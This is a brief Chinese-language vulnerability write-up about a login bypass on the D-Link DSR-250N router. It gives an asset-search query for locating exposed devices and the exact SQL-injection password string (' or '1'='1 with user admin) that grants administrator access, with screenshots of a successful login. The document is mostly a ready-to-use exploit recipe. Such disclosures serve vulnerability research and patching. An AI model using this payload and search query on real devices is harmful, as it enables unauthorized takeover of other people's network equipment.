# D-Link DSR-250N 万能密码漏洞

## 漏洞描述

D-Link DSR-250N 存在万能密码漏洞，攻击者通过漏洞可以获取后台权限

## 漏洞影响

```
D-Link DSR-250N
```

## 网络测绘

```
app="D_Link-DSR-250N"
```

## 漏洞复现

登录页面如下

![](images/202202162222919.png)

```plain
user: admin
pass: ' or '1'='1
```

成功登录后台

![](images/202202162223338.png)